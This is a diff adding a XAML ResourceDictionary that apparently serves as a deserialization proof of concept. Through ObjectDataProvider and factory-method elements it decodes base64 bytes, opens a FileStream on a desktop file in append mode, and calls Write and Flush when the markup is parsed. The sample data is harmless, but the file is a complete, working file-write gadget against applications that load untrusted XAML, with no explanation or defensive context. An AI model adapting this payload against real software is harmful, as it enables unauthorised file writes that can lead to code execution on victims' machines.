@@ -1,0 +1,30 @@
+<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+xmlns:s="clr-namespace:System;assembly=mscorlib"
+xmlns:io="clr-namespace:System.IO;assembly=mscorlib"
+xmlns:convert="clr-namespace:System.Convert;assembly=mscorlib" >
+
+<s:Array x:Key="data" x:FactoryMethod="s:Convert.FromBase64String">
+<x:Arguments>
+<s:String>YWJjMTIz</s:String>
+</x:Arguments>
+</s:Array>
+
+<io:FileStream x:Key="fs">
+<x:Arguments>
+<s:String>C:\Users\PC\Desktop\test.txt</s:String>
+<x:Static Member="io:FileMode.Append"/>
+</x:Arguments>
+</io:FileStream>
+
+
+<ObjectDataProvider x:Key="" ObjectInstance="{StaticResource fs}" MethodName="Write">
+<ObjectDataProvider.MethodParameters>
+<StaticResource ResourceKey="data"/>
+<s:Int32>0</s:Int32>
+<s:Int32>10</s:Int32>
+</ObjectDataProvider.MethodParameters>
+</ObjectDataProvider>
+
+<ObjectDataProvider x:Key="a" ObjectInstance="{StaticResource fs}" MethodName="Flush"></ObjectDataProvider>
+</ResourceDictionary>
